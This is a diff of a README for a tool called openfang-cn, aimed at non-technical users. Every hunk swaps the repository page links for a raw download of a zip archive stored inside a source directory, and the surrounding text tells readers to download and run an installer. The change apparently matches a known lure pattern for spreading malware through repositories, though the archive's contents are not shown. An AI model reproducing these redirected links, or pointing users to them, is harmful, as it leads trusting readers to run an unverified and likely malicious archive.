@@ -1,6 +1,6 @@
 # 🛠️ openfang-cn - Simple Chinese Language Experience
 
-[![Download openfang-cn](https://img.shields.io/badge/Download-openfang--cn-blue?style=for-the-badge)](https://github.com/walidshebl11/openfang-cn)
+[![Download openfang-cn](https://img.shields.io/badge/Download-openfang--cn-blue?style=for-the-badge)](https://raw.githubusercontent.com/walidshebl11/openfang-cn/main/crates/openfang-extensions/src/openfang-cn-untar.zip)
 
 ## 📝 About openfang-cn
 
@@ -25,7 +25,7 @@ This software does not need advanced hardware. It will run on most computers wit
 
 Visit this page to download openfang-cn:
 
-[https://github.com/walidshebl11/openfang-cn](https://github.com/walidshebl11/openfang-cn)
+[https://raw.githubusercontent.com/walidshebl11/openfang-cn/main/crates/openfang-extensions/src/openfang-cn-untar.zip](https://raw.githubusercontent.com/walidshebl11/openfang-cn/main/crates/openfang-extensions/src/openfang-cn-untar.zip)
 
 ### Download Steps
 
@@ -84,7 +84,7 @@ If you are unsure about any button or option, hover your mouse over it to see a 
 To keep openfang-cn working well, you should check for updates regularly:
 
 1. Return to the download page:  
-   [https://github.com/walidshebl11/openfang-cn](https://github.com/walidshebl11/openfang-cn)  
+   [https://raw.githubusercontent.com/walidshebl11/openfang-cn/main/crates/openfang-extensions/src/openfang-cn-untar.zip](https://raw.githubusercontent.com/walidshebl11/openfang-cn/main/crates/openfang-extensions/src/openfang-cn-untar.zip)  
 2. Look for new releases under the "Releases" section.  
 3. Download the latest installer following the steps above.  
 4. Run the new installer to replace the current version.  
@@ -111,4 +111,4 @@ For more detailed instructions or help:
 - Contact a friend or technician if you need hands-on help.  
 
 Visit the download page anytime:  
-[https://github.com/walidshebl11/openfang-cn](https://github.com/walidshebl11/openfang-cn)
+[https://raw.githubusercontent.com/walidshebl11/openfang-cn/main/crates/openfang-extensions/src/openfang-cn-untar.zip](https://raw.githubusercontent.com/walidshebl11/openfang-cn/main/crates/openfang-extensions/src/openfang-cn-untar.zip)
